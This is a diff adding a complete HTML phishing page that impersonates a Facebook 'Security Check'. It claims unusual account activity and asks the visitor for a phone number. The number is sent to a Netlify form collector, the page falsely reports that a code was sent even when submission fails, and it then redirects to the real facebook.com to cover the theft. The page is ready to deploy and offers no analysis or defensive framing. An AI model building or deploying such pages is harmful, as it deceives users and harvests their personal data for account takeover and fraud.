@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .verification-container {
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .facebook-logo {
+            font-size: 48px;
+            color: #1877f2;
+            font-weight: bold;
+            margin-bottom: 24px;
+        }
+
+        .verification-icon {
+            width: 80px;
+            height: 80px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+
+        .main-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #65676b;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .info-box {
+            background: #e7f3ff;
+            border: 1px solid #1877f2;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .info-box-title {
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+
+        .info-box-text {
+            color: #65676b;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .phone-input {
+            width: 100%;
+            height: 60px;
+            padding: 18px 20px;
+            font-size: 19px;
+            border: 2px solid #dddfe2;
+            border-radius: 8px;
+            background: #ffffff;
+            font-family: inherit;
+            color: #1c1e21;
+            box-sizing: border-box;
+        }
+
+        .phone-input::placeholder {
+            color: #8a8d91;
+        }
+
+        .phone-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .helper-text {
+            font-size: 13px;
+            color: #65676b;
+            margin-top: 8px;
+        }
+
+        .verify-btn {
+            width: 100%;
+            padding: 16px;
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+            background: #1877f2;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+
+        .verify-btn:hover {
+            background: #166fe5;
+        }
+
+        .verify-btn:disabled {
+            background: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+
+        .alternative-text {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e4e6eb;
+            font-size: 14px;
+            color: #65676b;
+        }
+
+        .alternative-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .alternative-link:hover {
+            text-decoration: underline;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #65676b;
+        }
+
+        .lock-icon {
+            color: #42b72a;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="facebook-logo">facebook</div>
+        
+        <div class="verification-icon">🔒</div>
+        
+        <h1 class="main-title">Security Check</h1>
+        
+        <p class="subtitle">
+            We need to verify your identity to protect your account. Please enter your phone number to receive a verification code.
+        </p>
+
+        <div class="info-box">
+            <div class="info-box-title">Why are we asking this?</div>
+            <div class="info-box-text">
+                We detected unusual activity on your account. To keep your account secure, we need to verify it's really you.
+            </div>
+        </div>
+
+        <div class="success-message" id="successMessage">
+            ✓ Verification code sent! Please check your phone.
+        </div>
+
+        <form name="sms-verification" method="POST" data-netlify="true" netlify-honeypot="bot-field" id="verificationForm">
+            <input type="hidden" name="form-name" value="sms-verification">
+            <p style="display: none;">
+                <label>Don't fill: <input name="bot-field" /></label>
+            </p>
+
+            <div class="form-group">
+                <label class="form-label" for="phone">Phone Number</label>
+                <input 
+                    type="tel" 
+                    name="phone" 
+                    id="phone"
+                    class="phone-input"
+                    placeholder="+1 (555) 123-4567"
+                    required
+                >
+                <div class="helper-text">Enter your phone number with country code</div>
+            </div>
+
+            <button type="submit" class="verify-btn" id="verifyBtn">Send Code</button>
+        </form>
+
+        <div class="alternative-text">
+            Can't receive a code? <a href="#" class="alternative-link">Try another way</a>
+        </div>
+
+        <div class="security-badge">
+            <span class="lock-icon">🔒</span>
+            <span>Your information is secure and encrypted</span>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('verificationForm');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const successMessage = document.getElementById('successMessage');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Change button text
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Sending code...';
+            
+            // Submit form data to Netlify
+            const formData = new FormData(form);
+            
+            fetch('/', {
+                method: 'POST',
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams(formData).toString()
+            }).then(() => {
+                // Show success message
+                successMessage.style.display = 'block';
+                verifyBtn.textContent = 'Code Sent!';
+                
+                // Wait 3 seconds then redirect to Facebook
+                setTimeout(function() {
+                    window.location.href = 'https://www.facebook.com';
+                }, 3000);
+            }).catch(() => {
+                // If submission fails, still show success and redirect
+                successMessage.style.display = 'block';
+                verifyBtn.textContent = 'Code Sent!';
+                
+                setTimeout(function() {
+                    window.location.href = 'https://www.facebook.com';
+                }, 3000);
+            });
+        });
+
+        // Format phone number as user types
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                if (value.length <= 3) {
+                    value = value;
+                } else if (value.length <= 6) {
+                    value = value.slice(0, 3) + '-' + value.slice(3);
+                } else {
+                    value = value.slice(0, 3) + '-' + value.slice(3, 6) + '-' + value.slice(6, 10);
+                }
+            }
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
